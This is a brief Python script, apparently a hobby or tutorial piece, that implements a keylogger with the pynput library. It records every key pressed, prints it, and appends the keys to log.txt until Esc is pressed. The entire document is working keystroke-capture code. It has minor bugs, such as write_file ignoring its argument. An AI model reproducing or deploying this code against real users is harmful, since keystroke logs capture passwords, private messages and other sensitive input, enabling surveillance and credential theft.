# importing pynput to use its functions to capture key inputs
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
   
#breaks out of the loop 
def on_release(key):
    if key == Key.esc:
        return False
    
def write_file(key):
    with open('log.txt', 'a') as f:
        for key in keys:
            #removes teh quotation marks
            k = str(key).replace("'","")
            #removes the word space
            if k.find("space") > 0:
                f.write(' ')
            elif k.find('Key') == -1:
                f.write(k)

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

if('__main__' == __name__):
    print('it works')
    
